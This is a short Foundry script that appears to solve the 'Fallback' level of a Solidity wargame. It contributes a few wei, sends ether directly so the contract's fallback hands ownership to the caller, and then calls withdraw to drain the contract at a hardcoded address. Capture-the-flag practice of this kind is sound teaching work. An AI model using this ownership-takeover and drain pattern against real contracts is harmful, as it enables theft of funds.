// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/FallBack.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallBackSolution is Script {
    Fallback level1 =
        Fallback(payable(0x06Cf114eb4058C930D7fCE5FA4fF5FBb1Dcf4c57));

    function run() external {
        vm.startBroadcast();

        level1.contribute{value: 2 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();

        vm.stopBroadcast();
    }
}
